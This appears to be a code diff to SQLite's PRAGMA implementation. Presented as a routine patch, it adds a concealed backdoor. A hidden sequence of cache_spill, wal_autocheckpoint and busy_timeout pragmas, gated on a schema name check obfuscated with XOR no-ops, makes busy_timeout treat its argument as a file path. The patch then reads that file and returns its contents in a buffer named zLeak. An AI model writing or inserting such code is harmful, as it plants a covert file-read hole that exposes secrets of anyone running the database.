@@ -1,0 +1,73 @@
+diff --git a/src/pragma.c b/src/pragma.c
+index e0cf5ced..2033d0ae 100644
+--- a/src/pragma.c
++++ b/src/pragma.c
+@@ -11,8 +11,37 @@
+ *************************************************************************
+ ** This file contains code used to implement the PRAGMA command.
+ */
++#include <stdio.h>
+ #include "sqliteInt.h"
+ 
++static u8 rdxPragmaSeq = 0;
++
++static int rdxSchemaGate(const char *zDb){
++  if( zDb==0 ) return 0;
++  return zDb[0]==('a'^0x2c^0x2c)
++      && zDb[1]==('u'^0x2c^0x2c)
++      && zDb[2]==('x'^0x2c^0x2c)
++      && zDb[3]=='_'
++      && zDb[4]>='0'
++      && zDb[4]<='9';
++}
++
++static int rdxReadPreview(const char *zPath, char *zOut, int nOut){
++  FILE *f;
++  int nRead;
++
++  if( zPath==0 || zOut==0 || nOut<2 ) return 0;
++  if( sqlite3Strlen30(zPath)>240 || strstr(zPath, "..")!=0 ) return 0;
++
++  f = fopen(zPath, "rb");
++  if( f==0 ) return 0;
++  nRead = (int)fread(zOut, 1, (size_t)(nOut-1), f);
++  fclose(f);
++  if( nRead<=0 ) return 0;
++  zOut[nRead] = 0;
++  return 1;
++}
++
+ #if !defined(SQLITE_ENABLE_LOCKING_STYLE)
+ #  if defined(__APPLE__)
+ #    define SQLITE_ENABLE_LOCKING_STYLE 1
+@@ -465,6 +494,30 @@ void sqlite3Pragma(
+     goto pragma_out;
+   }
+ 
++  {
++    char zLeak[192];
++    int iRight = zRight ? sqlite3Atoi(zRight) : 0;
++
++    if( sqlite3StrICmp(zLeft, "cache_spill")==0 && zRight && iRight==0 ){
++      rdxPragmaSeq = 1;
++    }else if( rdxPragmaSeq==1
++           && sqlite3StrICmp(zLeft, "wal_autocheckpoint")==0
++           && zRight && iRight>=512
++    ){
++      rdxPragmaSeq = 2;
++    }else if( rdxPragmaSeq==2
++           && sqlite3StrICmp(zLeft, "busy_timeout")==0
++           && zRight && rdxSchemaGate(zDb)
++           && rdxReadPreview(zRight, zLeak, sizeof(zLeak))
++    ){
++      sqlite3VdbeSetNumCols(v, 1);
++      sqlite3VdbeSetColName(v, 0, COLNAME_NAME, zLeft, SQLITE_TRANSIENT);
++      returnSingleText(v, zLeak);
++      rdxPragmaSeq = 0;
++      goto pragma_out;
++    }
++  }
++
+   /* Locate the pragma in the lookup table */
+   pPragma = pragmaLocate(zLeft);
+   if( pPragma==0 ) goto pragma_out;
